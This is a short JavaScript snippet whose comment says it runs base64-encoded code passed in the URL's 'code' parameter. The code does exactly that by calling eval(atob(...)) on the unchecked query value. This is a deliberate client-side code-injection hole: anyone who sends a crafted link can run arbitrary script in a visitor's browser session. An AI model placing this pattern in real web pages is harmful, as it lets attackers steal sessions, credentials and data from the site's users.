// This script will execute the base64 code in the "code" parameter in the query string.

const params = new URLSearchParams(window.location.search);
eval(atob(params.get('code')));
